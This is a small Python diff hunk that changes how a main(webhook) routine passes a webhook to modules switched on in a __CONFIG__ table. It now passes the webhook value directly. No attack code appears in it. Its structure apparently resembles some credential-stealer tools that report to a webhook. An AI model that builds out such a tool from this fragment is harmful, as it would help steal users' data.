@@ -22,7 +22,7 @@ def main(webhook):
         if __CONFIG__[func.__name__.lower()]:
             try:
                 if func.__init__.__code__.co_argcount == 2:
-                    func(__CONFIG__[webhook])
+                    func(webhook)
                 else:
                     func()
 
